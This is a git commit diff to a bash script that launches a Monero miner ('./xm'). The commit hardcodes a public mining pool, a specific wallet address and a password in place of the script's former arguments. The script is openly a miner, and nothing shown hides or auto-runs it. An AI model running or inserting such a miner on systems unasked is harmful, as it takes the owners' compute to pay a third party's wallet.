d53d5d084189197f0ccb8f8fee81784d5463451a
max313iq <153689278+max313iq@users.noreply.github.com>
2023-12-13 02:22:59 +0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
-poolUrl=$1
-poolUser=$2
-poolPW=$3
+poolUrl=pool.supportxmr.com:443
+poolUser=4691KgJYBgedzCy4doB5ZEBF1JN4LYyytj6qRrrQt5PJAAQDHiEMZcxU6mfLNk8NapMVRm7AW5cwc9NMTY7JShGUEvMVALY
+poolPW=max
 
 miner="./xm"
 $miner -o "$poolUrl" -u "$poolUser" -p "$poolPW" -a rx/0 -k;
